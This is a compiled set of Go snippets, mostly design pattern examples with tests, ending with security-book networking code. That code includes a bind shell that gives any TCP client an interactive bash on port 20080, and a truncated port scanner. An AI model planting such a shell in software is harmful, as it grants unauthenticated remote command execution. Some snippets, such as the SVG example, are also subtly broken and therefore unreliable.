  products := []Producter{
    factory.CreateProduct("A"),
    factory.CreateProduct("B"),
    factory.CreateProduct("C"),
  }
  for i, product := range products {
    if action := product.Use(); action != assert[i] {
      t.Errorf("Expect action to %s, but %s.\n", assert[i], action)
    }
  }
}
==================================================
Pattern Prototype
(tags: pattern prototype)
---

https://github.com/AlexanderGrom/go-patterns

The Prototype pattern is an object-level procreative pattern.

The Prototype pattern allows you to create new objects by copying (cloning) a previously created original product object (prototype).

The pattern describes the process of creating clone objects based on an existing prototype object, in other words, the Prototype pattern describes how the cloning process is organized.

Required for implementation:

1. The base class Prototype, which declares the cloning interface. All its inheriting classes must implement this cloning mechanism;
2. The ConcretePrototypeA product class that must implement this prototype;
3. The ConcretePrototypeB product class that must implement this prototype.

Usually the cloning operation occurs through the clone () method, which is described in the base class and must be implemented by each product.

package prototype

// Prototyper provides a cloning interface.
type Prototyper interface {
  Clone() Prototyper
  GetName() string
}
// ConcreteProduct implements product "A"
type ConcreteProduct struct {
  name string // Имя продукта
}
// NewConcreteProduct is the Prototyper constructor.
func NewConcreteProduct(name string) Prototyper {
  return &ConcreteProduct{
    name: name,
  }
}
// GetName returns product name
func (p *ConcreteProduct) GetName() string {
  return p.name
}
// Clone returns a cloned object.
func (p *ConcreteProduct) Clone() Prototyper {
  return &ConcreteProduct{p.name}
}

func TestPrototype(t *testing.T) {
  product := NewConcreteProduct("A")
  cloneProduct := product.Clone()
  if cloneProduct.GetName() != product.GetName() {
    t.Error("Expect name \"A\" to equal, but not equal.")
  }
}
==================================================
Pattern Singleton
(tags: pattern singleton)
---

https://github.com/AlexanderGrom/go-patterns

The Singleton pattern is an object-level ancestor pattern.
The pattern controls the creation of a single instance of a certain class and provides access to it.
In other words, Singleton ensures that the class has only one instance and provides an access point to it through a factory method.

Required for implementation:

1. The GetInstance function, which creates an instance of the Singleton class only once. If an instance has already been created before, then it simply returns this instance.

package singleton

import "sync"

// Singleton implementation.
type Singleton struct {
}
var (
  instance *Singleton
  once     sync.Once
)
// GetInstance returns singleton
func GetInstance() *Singleton {
  once.Do(func() {
    instance = &Singleton{}
  })
  return instance
}

func TestSingleton(t *testing.T) {
  instance1 := GetInstance()
  instance2 := GetInstance()
  if instance1 != instance2 {
    t.Error("Objects are not equal!\n")
  }
}
==================================================
Pattern Adapter
(tags: pattern adapter)
---

https://github.com/AlexanderGrom/go-patterns

The Adapter pattern is a class-level structural pattern.

Often in a new project, developers want to reuse existing code. For example, existing classes may have the desired functionality and yet have incompatible interfaces. In such cases, the Adapter pattern should be used.

The meaning of this pattern is that if you have a class and its interface is not compatible with the code of your system, then in order to resolve this conflict, we do not change the code of this class, but write an adapter for it. In other words, Adapter adapts existing code to the required interface (it is an adapter).

Required for implementation:

1. Target interface, describing the target interface (the interface with which our system would like to work);
2. The Adaptee class, which our system must adapt for itself;
3. An Adapter class, an adapter that implements the target interface.

package adapter

// Target provides an interface with which the system should work.
type Target interface {
  Request() string
}
// Adaptee implements system to be adapted.
type Adaptee struct {
}
// NewAdapter is the Adapter constructor.
func NewAdapter(adaptee *Adaptee) Target {
  return &Adapter{adaptee}
}
// SpecificRequest implementation.
func (a *Adaptee) SpecificRequest() string {
  return "Request"
}
// Adapter implements Target interface and is an adapter.
type Adapter struct {
  *Adaptee
}
// Request is an adaptive method.
func (a *Adapter) Request() string {
  return a.SpecificRequest()
}

func TestAdapter(t *testing.T) {
  adapter := NewAdapter(&Adaptee{})
  req := adapter.Request()
  if req != "Request" {
    t.Errorf("Expect volume to %s, but %s", "Request", req)
  }
}
==================================================
Pattern Bridge
(tags: pattern bridge)
---

https://github.com/AlexanderGrom/go-patterns

The Bridge pattern refers to object-level structural patterns.

The Bridge pattern allows you to separate an object into abstraction and implementation so that they can change independently of each other.

If several implementations are possible for one abstraction, then inheritance is usually used. However, this approach is not always convenient, since inheritance tightly ties the implementation to the abstraction, which makes it difficult to independently modify and complicate their reuse.

The pattern should be used when we have an abstraction and several implementations of it. Of course, it makes no sense to separate the abstraction from the implementation if there can be only one implementation.

I have not found any adequate description of the "Bridge" pattern. Everything that I have come across is either not true and examples are sucked from the finger or very blurry. From what I understand and can explain on my fingers - the Bridge is a tricky aggregation. The class that implements the product, implements the interface of the aggregated class, which is slipped at the stage of creating an instance of the product class.

As I understand it ... we have 3 cars and 3 different engines. Every engine fits every machine, i.e. it implements its interface. If we do this by inheritance, we get 9 different classes. It turns out that each vehicle has 3 modifications. This is inconvenient, so we will slip the engine at the stage of creating the car. Also, each engine can run on a different fuel, diesel or gasoline, so as not to produce 6 different implementations, when creating an engine, we will slip the type of fuel into it.

To implement the pattern in this example, you need to add a field in the base car class to store a pointer to the implementation type, the value of which the class will receive in its constructor, and call the methods of the nested object, if necessary.

Required for implementation:

1. Base abstract class (in our case, describing a car);
2. A class that implements the base class. It has a property in which we will slip the pointer to the engine used (the car can work with any of the presented engines);
3. Abstraction of the engine;
4. Realization of the engine.

In general, the property storing a pointer to the used object is a bridge. We can slip different objects into it, the main thing is that they have the same interface.

package bridge

// Carer provides car interface.
type Carer interface {
  Rase() string
}
// Enginer provides engine interface.
type Enginer interface {
  GetSound() string
}
// Car implementation.
type Car struct {
  engine Enginer
}
// NewCar is the Car constructor.
func NewCar(engine Enginer) Carer {
  return &Car{
    engine: engine,
  }
}
// Rase implementation.
func (c *Car) Rase() string {
  return c.engine.GetSound()
}
// EngineSuzuki implements Suzuki engine.
type EngineSuzuki struct {
}
// GetSound returns sound of the engine.
func (e *EngineSuzuki) GetSound() string {
  return "SssuuuuZzzuuuuKkiiiii"
}
// EngineHonda implements Honda engine.
type EngineHonda struct {
}
// GetSound returns sound of the engine.
func (e *EngineHonda) GetSound() string {
  return "HhoooNnnnnnnnnDddaaaaaaa"
}
// EngineLada implements Lada engine.
type EngineLada struct {
}
// GetSound returns sound of the engine.
func (e *EngineLada) GetSound() string {
  return "PhhhhPhhhhPhPhPhPhPh"
}

func TestBridge(t *testing.T) {
  expect := "SssuuuuZzzuuuuKkiiiii"
  car := NewCar(&EngineSuzuki{})
  sound := car.Rase()
  if sound != expect {
    t.Errorf("Expect sound to %s, but %s", expect, sound)
  }
}
==================================================
Pattern Composite
(tags: pattern composite)
---

https://github.com/AlexanderGrom/go-patterns

The Composite pattern refers to object-level structural patterns.

The Composite pattern groups similar objects into tree structures.

Arrays representing the branches of the tree will be used to build the tree.

Required for implementation:

1. Basic abstract class Component which provides an interface for both branches and leaves of a tree;
2. The Composite class that implements the Component interface and is a branch of the tree;
3. The Leaf class, which implements the Component interface and is a leaf of the tree.

Note that a leaf in a tree is a leaf node class and cannot have descendants (a branch or other leaf cannot grow from a leaf).

Branches of a tree define the behavior of objects included in the tree structure, which have descendants, and also store the components of the tree themselves. In other words, branches can contain other branches and leaves.

The main purpose of the pattern is to provide a single interface to both the composite (branch) and the final (leaf) object, so that the client does not think about which object he is working with.

package composite

// Component provides an interface for branches and leaves of a tree.
type Component interface {
  Add(child Component)
  Name() string
  Child() []Component
  Print(prefix string) string
}
// Directory implements branches of a tree
type Directory struct {
  name   string
  childs []Component
}
// Add appends an element to the tree branch.
func (d *Directory) Add(child Component) {
  d.childs = append(d.childs, child)
}
// Name returns name of the Component.
func (d *Directory) Name() string {
  return d.name
}
// Child returns child elements.
func (d *Directory) Child() []Component {
  return d.childs
}
// Print returns the branche in string representation.
func (d *Directory) Print(prefix string) string {
  result := prefix + "/" + d.Name() + "\n"
  for _, val := range d.Child() {
    result += val.Print(prefix + "/" + d.Name())
  }
  return result
}
// File implements a leaves of a tree
type File struct {
  name string
}
// Add implementation.
func (f *File) Add(child Component) {
}
// Name returns name of the Component.
func (f *File) Name() string {
  return f.name
}
// Child implementation.
func (f *File) Child() []Component {
  return []Component{}
}
// Print returns the leave in string representation.
func (f *File) Print(prefix string) string {
  return prefix + "/" + f.Name() + "\n"
}
// NewDirectory is constructor.
func NewDirectory(name string) *Directory {
  return &Directory{
    name: name,
  }
}
// NewFile is constructor.
func NewFile(name string) *File {
  return &File{
    name: name,
  }
}

func TestComposite(t *testing.T) {
  expect := "/root\n/root/usr\n/root/usr/B\n/root/A\n"
  rootDir := NewDirectory("root")
  usrDir := NewDirectory("usr")
  fileA := NewFile("A")
  rootDir.Add(usrDir)
  rootDir.Add(fileA)
  fileB := NewFile("B")
  usrDir.Add(fileB)
  result := rootDir.Print("")
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Decorator
(tags: pattern decorator)
---

https://github.com/AlexanderGrom/go-patterns

Decorator pattern refers to object-level structural patterns.

The Decorator pattern is used to extend the functionality of objects by dynamically adding new capabilities to an object. When implementing the pattern, the composition relation is used.

The essence of the decorator's work is to wrap the finished object with new functionality, while the entire original interface of the object remains accessible, by sending the decorator of all requests to the wrapped object.

Required for implementation:

1. The base abstract class Component which provides an interface for the decorator and component classes;
2. The ConcreteDecorator class, which implements the Component interface and reloads all methods of the component; if necessary, functionality is added to them;
3. The ConcreteComponent class implements the Component interface and will be wrapped with a decorator.

With such a structure, it doesn't matter to us whether the component is a decorator or a concrete implementation, since they have the same interface, and we can make decorator chains. Thus, dynamically change the state and behavior of the object.

I heard the example with Carlson and I really liked it. We have Carlson, we put a jumpsuit on him, thereby changing his state, then we put a propeller on his pants, thereby changing his behavior. The propeller can be removed, depending on the situation, by changing the behavior to the opposite, or you can wear a different overalls with different properties.

package decorator

// Component provides an interface for a decorator and component.
type Component interface {
  Operation() string
}
// ConcreteComponent implements a component.
type ConcreteComponent struct {
}
// Operation implementation.
func (c *ConcreteComponent) Operation() string {
  return "I am component!"
}
// ConcreteDecorator implements a decorator.
type ConcreteDecorator struct {
  component Component
}
// Operation wraps operation of component
func (d *ConcreteDecorator) Operation() string {
  return "<strong>" + d.component.Operation() + "</strong>"
}

func TestDecorator(t *testing.T) {
  expect := "<strong>I am component!</strong>"
  decorator := &ConcreteDecorator{&ConcreteComponent{}}
  result := decorator.Operation()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Facade
(tags: pattern facade)
---

https://github.com/AlexanderGrom/go-patterns

The Facade pattern refers to object-level structural patterns.

The Facade pattern provides a high-level unified interface in the form of a set of method names to a set of related classes or objects of a subsystem, which makes it easier to use.

Dividing a complex system into subsystems simplifies the development process, and also helps to minimize the dependence of one subsystem on another. However, using such subsystems becomes quite difficult. One way to solve this problem is the Facade pattern. Our task is to make a simple, unified interface through which one could interact with subsystems.

An example is the car interface. Modern cars have a unified driver interface that hides a complex subsystem. Thanks to the use of sophisticated electronics that do most of the work for the driver, he can easily drive a car without thinking about how everything works there.

Required for implementation:

1. The Facade class provides unified access for the subsystem classes;
2. Subsystem class SubSystemA;
3. Subsystem class SubSystemB;
4. Subsystem class SubSystemC.

Note that the facade is not the only point of access to the subsystem, nor does it limit the capabilities that might be needed by "advanced" users who want to work directly with the subsystem.

package facade

import "strings"

// NewMan creates man.
func NewMan() *Man {
  return &Man{
    house: &House{},
    tree:  &Tree{},
    child: &Child{},
  }
}
// Man implements man and facade.
type Man struct {
  house *House
  tree  *Tree
  child *Child
}
// Todo returns that man must do.
func (m *Man) Todo() string {
  result := []string{
    m.house.Build(),
    m.tree.Grow(),
    m.child.Born(),
  }
  return strings.Join(result, "\n")
}
// House implements a subsystem "House"
type House struct {
}
// Build implementation.
func (h *House) Build() string {
  return "Build house"
}
// Tree implements a subsystem "Tree"
type Tree struct {
}
// Grow implementation.
func (t *Tree) Grow() string {
  return "Tree grow"
}
// Child implements a subsystem "Child"
type Child struct {
}
// Born implementation.
func (c *Child) Born() string {
  return "Child born"
}

func TestFacade(t *testing.T) {
  expect := "Build house\nTree grow\nChild born"
  man := NewMan()
  result := man.Todo()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Flyweight
(tags: pattern flyweight)
---

https://github.com/AlexanderGrom/go-patterns

The Flyweight pattern refers to object-level structural patterns.

The Flyweight pattern is used to efficiently support a large number of small objects, it allows you to reuse small objects in different contexts.

Required for implementation:

1. The FlyweightFactory class, which is a modified factory pattern for creating flyweight;
2. Base abstract class Flyweight, to describe the general interface of flyweight;
3. The ConcreteFlyweight class implements a flyweight that will replace the same small objects.

The bottom line is that we can request opportunists from the factory upon request, in turn, it will return those objects that have already been created, or create new ones. This means that we will use the already created objects, and not create even more, if the objects for ours already exist.

package flyweight

// Flyweighter interface
type Flyweighter interface {
  GetName() string
  SetName(name string)
}
// FlyweightFactory implements a factory.
// If a suitable flyweighter is in pool, then returns it.
type FlyweightFactory struct {
  pool map[int]Flyweighter
}
// GetFlyweight creates or returns a suitable Flyweighter by state.
func (f *FlyweightFactory) GetFlyweight(state int) Flyweighter {
  if f.pool == nil {
    f.pool = make(map[int]Flyweighter)
  }
  if _, ok := f.pool[state]; !ok {
    f.pool[state] = &ConcreteFlyweight{state: state}
  }
  return f.pool[state]
}
// ConcreteFlyweight implements a Flyweighter interface.
type ConcreteFlyweight struct {
  state int
  name  string
}
// GetName returns name
func (f *ConcreteFlyweight) GetName() string {
  return "My name: " + f.name
}
// SetName sets a name
func (f *ConcreteFlyweight) SetName(name string) {
  f.name = name
}

func TestFlyweight(t *testing.T) {
  expect := "My name: Jeck"
  factory := new(FlyweightFactory)
  flyweight1 := factory.GetFlyweight(1)
  flyweight2 := factory.GetFlyweight(2)
  flyweight3 := factory.GetFlyweight(3)
  flyweight1.SetName("Jim")
  flyweight2.SetName("Jeck")
  flyweight3.SetName("Jill")
  flyweightN := factory.GetFlyweight(2)
  result := flyweightN.GetName()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Proxy
(tags: pattern proxy)
---

https://github.com/AlexanderGrom/go-patterns

The Proxy pattern refers to object-level structural patterns.

The Proxy pattern provides an object to control access to another object.

Another name for the pattern is "Surrogate". In this sense, it is an item or product that replaces any other item or product with which the surrogate has only some common properties, but it does not have all the qualities of the original item or product.

The Proxy pattern puts forward a number of important requirements, namely that the original object and its surrogate must interact with each other, and there must also be a possibility of replacing the original object, a surrogate at the place of its use, respectively, the interaction interfaces of the original object and its surrogate must coincide.

It will be easier for you to understand the pattern if you've watched the movie "Surrogates".

Required for implementation:

1. Interface Subject, which is a common interface for a real object and its surrogate;
2. The RealSubject class that implements the real object;
3. The Proxy class that implements the surrogate object. Stores a reference to the real object, which allows the proxy to access the real object directly;

For example, the Proxy pattern can be used if we need to manage resource-intensive objects, but we don't want to instantiate such objects until they are actually used.

You might think this is the same as Adapter or Decorator. But...

Proxy provides the same interface to its object.
Adapter provides a different interface.
Decorator provides an advanced interface.

package proxy

// Subject provides an interface for a real subject and its surrogate.
type Subject interface {
  Send() string
}
// Proxy implements a surrogate.
type Proxy struct {
  realSubject Subject
}
// Send sends a message
func (p *Proxy) Send() string {
  if p.realSubject == nil {
    p.realSubject = &RealSubject{}
  }
  return "<strong>" + p.realSubject.Send() + "</strong>"
}
// RealSubject implements a real subject
type RealSubject struct {
}
// Send sends a message
func (s *RealSubject) Send() string {
  return "I’ll be back!"
}

func TestProxy(t *testing.T) {
  expect := "<strong>I’ll be back!</strong>"
  proxy := new(Proxy)
  result := proxy.Send()
  if result != expect {
    t.Errorf("Expect result to equal %s, but %s.\n", expect, result)
  }
}
==================================================
Pattern Specification
(tags: pattern specification)
---

https://github.com/AlexanderGrom/go-patterns

A specification is a design pattern by which a business logic rule representation can be transformed into a chain of objects linked by Boolean logic operations.

// Pattern Specification
//
// In the following example, we are retrieving invoices and sending them to a collection agency if
//  1. they are overdue,
//  2. notices have been sent, and
//  3. they are not already with the collection agency.
// This example is meant to show the end result of how the logic is 'chained' together.
//
// This usage example assumes a previously defined OverdueSpecification class
// that is satisfied when an invoice's due date is 30 days or older,
// a NoticeSentSpecification class that is satisfied when three notices
// have been sent to the customer, and an InCollectionSpecification class
// that is satisfied when an invoice has already been sent to the collection
// agency. The implementation of these classes isn't important here.

package specification

// Data for analysis
type Invoice struct {
  Day    int
  Notice int
  IsSent bool
}
/////
// Invoice Specification Interface
type Specification interface {
  IsSatisfiedBy(Invoice) bool
  And(Specification) Specification
  Or(Specification) Specification
  Not() Specification
  Relate(Specification)
}
/////
// Invoice BaseSpecification
type BaseSpecification struct {
  Specification
}
// Check specification
func (self *BaseSpecification) IsSatisfiedBy(elm Invoice) bool {
  return false
}
// Condition AND
func (self *BaseSpecification) And(spec Specification) Specification {
  a := &AndSpecification{
    self.Specification, spec,
  }
  a.Relate(a)
  return a
}
// Condition OR
func (self *BaseSpecification) Or(spec Specification) Specification {
  a := &OrSpecification{
    self.Specification, spec,
  }
  a.Relate(a)
  return a
}
// Condition NOT
func (self *BaseSpecification) Not() Specification {
  a := &NotSpecification{
    self.Specification,
  }
  a.Relate(a)
  return a
}
// Relate to specification
func (self *BaseSpecification) Relate(spec Specification) {
  self.Specification = spec
}
/////
// AndSpecification
type AndSpecification struct {
  Specification
  compare Specification
}
// Check specification
func (self *AndSpecification) IsSatisfiedBy(elm Invoice) bool {
  return self.Specification.IsSatisfiedBy(elm) && self.compare.IsSatisfiedBy(elm)
}
/////
// OrSpecification
type OrSpecification struct {
  Specification
  compare Specification
}
// Check specification
func (self *OrSpecification) IsSatisfiedBy(elm Invoice) bool {
  return self.Specification.IsSatisfiedBy(elm) || self.compare.IsSatisfiedBy(elm)
}
/////
// NotSpecification
type NotSpecification struct {
  Specification
}
// Check specification
func (self *NotSpecification) IsSatisfiedBy(elm Invoice) bool {
  return !self.Specification.IsSatisfiedBy(elm)
}
/////
// Invoice's due date is 30 days or older
type OverDueSpecification struct {
  Specification
}
// Check specification
func (self *OverDueSpecification) IsSatisfiedBy(elm Invoice) bool {
  return elm.Day >= 30
}
// Constructor
func NewOverDueSpecification() Specification {
  a := &OverDueSpecification{&BaseSpecification{}}
  a.Relate(a)
  return a
}
// Three notices have been sent to the customer
type NoticeSentSpecification struct {
  Specification
}
// Check specification
func (self *NoticeSentSpecification) IsSatisfiedBy(elm Invoice) bool {
  return elm.Notice >= 3
}
// Constructor
func NewNoticeSentSpecification() Specification {
  a := &NoticeSentSpecification{&BaseSpecification{}}
  a.Relate(a)
  return a
}
// Invoice has already been sent to the collection agency.
type InCollectionSpecification struct {
  Specification
}
// Check specification
func (self *InCollectionSpecification) IsSatisfiedBy(elm Invoice) bool {
  return !elm.IsSent
}
// Constructor
func NewInCollectionSpecification() Specification {
  a := &InCollectionSpecification{&BaseSpecification{}}
  a.Relate(a)
  return a
}

func TestSpecification(t *testing.T) {
  overDue := NewOverDueSpecification()
  noticeSent := NewNoticeSentSpecification()
  inCollection := NewInCollectionSpecification()
  sendToCollection := overDue.And(noticeSent).And(inCollection.Not())
  invoice := Invoice{
    Day:    31,    // >= 30
    Notice: 4,     // >= 3
    IsSent: false, // false
  }
  // true!
  result := sendToCollection.IsSatisfiedBy(invoice)
  if !result {
    t.Errorf("Expect result to equal %v, but %v.\n", false, true)
  }
}
==================================================
Idiom functional options in constructor
(tags: idiom functional options constructor)
---

https://github.com/tmrts/go-patterns

Functional options are a method of implementing clean/eloquent APIs in Go. Options implemented as a function set the state of that option.

type Options struct {
  UID         int
  GID         int
  Flags       int
  Contents    string
  Permissions os.FileMode
}

type Option func(*Options)

func UID(userID int) Option {
  return func(args *Options) {
    args.UID = userID
  }
}
func GID(groupID int) Option {
  return func(args *Options) {
    args.GID = groupID
  }
}
func Contents(c string) Option {
  return func(args *Options) {
    args.Contents = c
  }
}
func Permissions(perms os.FileMode) Option {
  return func(args *Options) {
    args.Permissions = perms
  }
}

func New(filepath string, setters ...Option) error {
  // Default Options
  args := &Options{
    UID:         os.Getuid(),
    GID:         os.Getgid(),
    Contents:    "",
    Permissions: 0644,
    Flags:       os.O_CREATE | os.O_EXCL | os.O_WRONLY,
  }
  for _, setter := range setters {
    setter(args)
  }
  f, err := os.OpenFile(filepath, args.Flags, args.Permissions)
  if err != nil {
    return err
  } else {
    defer f.Close()
  }
  if _, err := f.WriteString(args.Contents); err != nil {
    return err
  }
  return f.Chown(args.UID, args.GID)
}

func main() {
  New("empty.txt")
  New("file.txt", UID(1000), Contents("Lorem Ipsum Dolor Amet"))
}
==================================================
Pattern FanIn
(tags: pattern fanin merge)
---

https://github.com/tmrts/go-patterns

Fan-In is a messaging pattern used to create a funnel for work amongst workers (clients: source, server: destination).

We can model fan-in using the Go channels.

package main

import (
  "fmt"
  "sync"
  "time"
)

// Merge different channels in one channel
func Merge(cs ...<-chan int) <-chan int {
  var wg sync.WaitGroup
  out := make(chan int)
  // Start an send goroutine for each input channel in cs. send
  // copies values from c to out until c is closed, then calls wg.Done.
  send := func(c <-chan int) {
    for n := range c {
      out <- n
    }
    wg.Done()
  }
  wg.Add(len(cs))
  for _, c := range cs {
    go send(c)
  }
  // Start a goroutine to close out once all the send goroutines are
  // done.  This must start after the wg.Add call.
  go func() {
    wg.Wait()
    close(out)
  }()
  return out
}

func main() {
  ch1 := make(chan int, 3)
  ch2 := make(chan int, 3)
  go func() {
    for i := 0; i < 3; i++ {
      ch1 <- i
    }
  }()
  go func() {
    for i := 0; i < 3; i++ {
      ch2 <- i
    }
  }()
  ch3 := Merge(ch1, ch2)

  // without goroutine there will be deadlock!

  //go func() {
  //  for val := range ch3 {
  //    fmt.Println(val)
  //  }
  //}()

  go func() {
    for {
      select {
      case val := <- ch3:
        fmt.Println(val)
      }
    }
  }()
  time.Sleep(time.Second)
}
==================================================
Pattern FanOut
(tags: pattern fanout split)
---

https://github.com/tmrts/go-patterns

Fan-Out is a messaging pattern used for distributing work amongst workers (producer: source, consumers: destination).

We can model fan-out using the Go channels.

package main

import (
  "fmt"
  "time"
)

// Split a channel into n channels that receive messages in a round-robin fashion.
func Split(ch <-chan int, n int) []chan int {
  cs := make([]chan int, 0, n)
  for i := 0; i < n; i++ {
    cs = append(cs, make(chan int))
  }
  // Distributes the work in a round robin fashion among the stated number
  // of channels until the main channel has been closed. In that case, close
  // all channels and return.
  distributeToChannels := func(ch <-chan int, cs []chan int) {
    // Close every channel when the execution ends.
    //defer func(cs []chan int) {
    //  for _, c := range cs {
    //    close(c)
    //  }
    //}(cs)
    for {
      for _, c := range cs {
        select {
        case val, ok := <-ch:
          if !ok {
            return
          }

          c <- val
        }
      }
    }
  }

  go distributeToChannels(ch, cs)

  return cs
}

func main() {
  ch1 := make(chan int, 6)
  go func() {
    for i := 0; i < 6; i++ {
      ch1 <- i
    }
  }()
  chs := Split(ch1, 2)

  go func() {
    for {
      select {
      case val := <-chs[0]:
        fmt.Println(val)
      case val := <-chs[1]:
        fmt.Println(val)
      default:
      }
    }
  }()
  time.Sleep(time.Second)
}
==================================================
Pattern Circuit breaker
(tags: pattern circuit breaker)
---

https://github.com/tmrts/go-patterns

Similar to electrical fuses that prevent fires when a circuit that is connected to the electrical grid starts drawing a high amount of power which causes the wires to heat up and combust, the circuit breaker design pattern is a fail-first mechanism that shuts down the circuit, request/response relationship or a service in the case of software development, to prevent bigger failures.

circuit.Counter is a simple counter that records success and failure states of a circuit along with a timestamp and calculates the consecutive number of failures.

Circuit is wrapped using the circuit.Breaker closure that keeps an internal operation counter. It returns a fast error if the circuit has failed consecutively more than the specified threshold. After a while it retries the request and records it.

Note: Context type is used here to carry deadlines, cancelation signals, and other request-scoped values across API boundaries and between processes.

package main

import (
  "fmt"
  "io/ioutil"
  "log"
  "net/http"

  "github.com/sony/gobreaker"
)

// Get wraps http.Get in CircuitBreaker.
func Get(cb *gobreaker.CircuitBreaker, url string) ([]byte, error) {
  body, err := cb.Execute(func() (interface{}, error) {
    resp, err := http.Get(url)
    if err != nil {
      return nil, err
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
      return nil, err
    }
    return body, nil
  })
  if err != nil {
    return nil, err
  }
  return body.([]byte), nil
}

func main() {
  var st gobreaker.Settings
  st.Name = "HTTP GET"
  st.ReadyToTrip = func(counts gobreaker.Counts) bool {
    failureRatio := float64(counts.TotalFailures) / float64(counts.Requests)
    return counts.Requests >= 3 && failureRatio >= 0.6
  }
  cb := gobreaker.NewCircuitBreaker(st)

  body, err := Get(cb, "http://www.google.com/robots.txt")
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println(string(body))
}
==================================================
Pattern Semaphore
(tags: pattern semaphore)
---

https://github.com/tmrts

A semaphore is a synchronization pattern/primitive that imposes mutual exclusion on a limited number of resources.

package main

import (
  "errors"
  "fmt"
  "time"
)

var (
  ErrNoTickets      = errors.New("semaphore: could not aquire semaphore")
  ErrIllegalRelease = errors.New("semaphore: can't release the semaphore without acquiring it first")
)

// Interface contains the behavior of a semaphore that can be acquired and/or released.
type Interface interface {
  Acquire() error
  Release() error
}

type implementation struct {
  sem     chan struct{}
  timeout time.Duration
}

func (s *implementation) Acquire() error {
  select {
  case s.sem <- struct{}{}:
    return nil
  case <-time.After(s.timeout):
    return ErrNoTickets
  }
}

func (s *implementation) Release() error {
  select {
  case _ = <-s.sem:
    return nil
  case <-time.After(s.timeout):
    return ErrIllegalRelease
  }
  return nil
}

func New(tickets int, timeout time.Duration) Interface {
  return &implementation{
    sem:     make(chan struct{}, tickets),
    timeout: timeout,
  }
}

func main() {
  // if tickets = 1 and timeout < 3*time.Second there will be a panic "semaphore: could not aquire semaphore"
  tickets, timeout := 3, time.Second
  s := New(tickets, timeout)
  for i := 0; i < 3; i++{
    go func(i int) {
      if err := s.Acquire(); err != nil {
        panic(err)
      }
      time.Sleep(1 * time.Second)
      fmt.Println("work", i)
      if err := s.Release(); err != nil {
        panic(err)
      }
    }(i)
  }
  time.Sleep(4 * time.Second)
}
==================================================
Create file with svg image
(tags: file svg image)
---

package main

import "github.com/ajstarks/svgo"

func main() {
  f, err := os.Create("1.svg")
  canvas := svg.New(io.Writer(f))
  canvas.Start(800, 600)
  txtOpt := "text-anchor:left;font-family:monospace;font-size:16px;fill:black"
  lineOpt := "fill:none;stroke-width:2px;stroke:rgb(0,255,0)"
  rectOpt := "fill:white;stroke-width:6px;stroke:rgb(0,255,255)"
  p.canvas.Roundrect(10, 10, 100, 30, 10, 10, rectOpt)
  p.canvas.Text(50, 50, "some text", txtOpt)
  p.canvas.Qbez(10, 20, 30, 40, 50, 60, lineOpt)
  p.canvas.End()
}
==================================================
Server with svg image in response
(tags: server svg image)
---

package main

import "github.com/ajstarks/svgo"

func main() {
  http.Handle("/circle", http.HandlerFunc(circle))
  err := http.ListenAndServe(":2003", nil)
}

func circle(w http.ResponseWriter, req *http.Request) {
  w.Header().Set("Content-Type", "image/svg+xml")
  s := svg.New(w)
  s.Start(500, 500)
  s.Circle(250, 250, 125, "fill:none;stroke:black")
  s.End()
}
==================================================
Reader and writer std in and out
(tags: reader writer std in out)
---

https://github.com/blackhat-go

package main

import (
  "fmt"
  "io"
  "log"
  "os"
)

// FooReader defines an io.Reader to read from stdin.
type FooReader struct{}

// Read reads data from stdin.
func (fooReader *FooReader) Read(b []byte) (int, error) {
  fmt.Print("in > ")
  return os.Stdin.Read(b)
}

// FooWriter defines an io.Writer to write to Stdout.
type FooWriter struct{}

// Write writes data to Stdout.
func (fooWriter *FooWriter) Write(b []byte) (int, error) {
  fmt.Print("out> ")
  return os.Stdout.Write(b)
}

func main() {
  // Instantiate reader and writer.
  var (
    reader FooReader
    writer FooWriter
  )

  if _, err := io.Copy(&writer, &reader); err != nil {
    log.Fatalln("Unable to read/write data")
  }
}
==================================================
Tcp echo server
(tags: tcp server)
---

https://github.com/blackhat-go

package main

import (
  "io"
  "log"
  "net"
)

// echo is a handler function that simply echoes received data.
func echo(conn net.Conn) {
  defer conn.Close()

  // Create a buffer to store received data.
  b := make([]byte, 512)
  for {
    // Receive data via conn.Read into a buffer.
    size, err := conn.Read(b[0:])
    if err == io.EOF {
      log.Println("Client disconnected")
      break
    }
    if err != nil {
      log.Println("Unexpected error")
      break
    }
    log.Printf("Received %d bytes: %s", size, string(b))

    // Send data via conn.Write.
    log.Println("Writing data")
    if _, err := conn.Write(b[0:size]); err != nil {
      log.Fatalln("Unable to write data")
    }
  }
}

func main() {
  // Bind to TCP port 20080 on all interfaces.
  listener, err := net.Listen("tcp", ":20080")
  if err != nil {
    log.Fatalln("Unable to bind to port")
  }
  log.Println("Listening on 0.0.0.0:20080")
  for {
    // Wait for connection. Create net.Conn on connection established.
    conn, err := listener.Accept()
    log.Println("Received connection")
    if err != nil {
      log.Fatalln("Unable to accept connection")
    }
    // Handle the connection. Using goroutine for concurrency.
    go echo(conn)
  }
}
==================================================
Remote shell
(tags: tcp shell remote std in out exec)
---

https://github.com/blackhat-go

package main

import (
  "io"
  "log"
  "net"
  "os/exec"
)

func handle(conn net.Conn) {
  /*
   * Explicitly calling /bin/sh and using -i for interactive mode
   * so that we can use it for stdin and stdout.
   * For Windows use exec.Command("cmd.exe")
   */
  //cmd := exec.Command("cmd.exe")
  //cmd := exec.Command("/bin/sh", "-i")
  cmd := exec.Command("/bin/bash", "-i")
  //cmd := exec.Command("pwd")
  rp, wp := io.Pipe()
  // Set stdin to our connection
  cmd.Stdin = conn
  cmd.Stdout = wp
  cmd.Stderr = wp
  go io.Copy(conn, rp)
  cmd.Run()
  conn.Close()
}

func main() {
  listener, err := net.Listen("tcp", ":20080")
  if err != nil {
    log.Fatalln(err)
  }
  for {
    conn, err := listener.Accept()
    if err != nil {
      log.Fatalln(err)
    }
    go handle(conn)
  }
}
==================================================
Port scanner
(tags: port scanner)
---

https://github.com/blackhat-go

package main

import (
  "fmt"
  "net"
  "sort"
)

func worker(ports, results chan int) {
  for p := range ports {
    address := fmt.Sprintf("scanme.nmap.org:%d", p)
    conn, err := net.Dial("tcp", address)
    if err != nil {
      results <- 0
      continue
    }
    conn.Close()
